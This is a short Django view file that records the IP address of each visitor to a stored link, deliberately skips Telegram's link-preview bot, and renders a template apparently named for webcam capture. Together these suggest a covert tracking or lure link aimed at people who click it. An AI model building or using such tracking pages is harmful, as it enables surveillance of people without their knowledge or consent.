from django.shortcuts import render
from django.http import JsonResponse
from api.models import Uri_link

def index(request, g_link):
    try:
        url_db = Uri_link.objects.get(url=g_link)
        print(f"{url_db=}")
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')

        if url_db.get_ips is None and request.headers['User-Agent'].startswith("TelegramBot"):
            print("Robot!")
        elif url_db.get_ips is None:
            url_db.get_ips = [ip]
            url_db.save()
        elif ip not in url_db.get_ips:
            url_db.get_ips.append(ip)
            url_db.save()
        context = {'name':url_db.name }
        protocol = request.META.get("wsgi.url_scheme")
        serv_name = request.META.get("SERVER_NAME")
        path = request.META.get("PATH_INFO")
        qr_txt = f"{protocol}://{serv_name}{path}"
        context["qr_txt"] = qr_txt
        return render(request, 'webcam_cap/index.html', context=context)
    except Uri_link.DoesNotExist:
        return JsonResponse({"status":"link not found"}, status=404)
